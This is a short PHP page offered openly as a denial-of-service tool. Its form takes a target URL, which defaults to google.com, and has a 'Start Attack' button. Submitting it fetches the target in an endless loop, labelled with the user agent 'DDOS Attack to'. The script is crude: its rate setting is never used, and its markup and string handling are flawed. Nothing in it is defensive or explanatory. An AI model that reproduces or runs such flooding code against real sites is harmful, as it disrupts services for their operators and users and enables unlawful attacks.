<html>
<head>
</head>
<body>
<?php
$http = $_POST['http'];
$submit = $_POST['submit'];
$select = $_POST['select'];

if(!$submit) {
	echo '
	<form action="index.php" method="post">
	<input name="http" value="http://www.google.com/"></input>
	<select <!--value="requests per second"--> name="select">
		<option>Default</option>
		<option>5</option>
		<option>10</option>
		<option>25</option>
		<option>50</option>
		<option>100</option>
	</select>
	<input value="Start Attack" type="submit" name="submit"></input>
	</form>
	';
}
echo "<hr>
<h3>Results:</h3>";
if($submit) {
	ini_set('user_agent', 'DDOS Attack to: $http');
	$ihttp = file_get_contents("$http");
	if($ihttp == true)
	{
		$file .= "Request - True";
		echo "Request - True<br>";
		echo "Do not reload this site...<br>";
		echo "Startup Attack...<br>";
		while(true)
		{
			print("Attacking...<br>");
			$ihttp = file_get_contents("$http");
		}
		return $ihttp;
	}
	echo "$ihttp";
}
?>
</body>
</html>
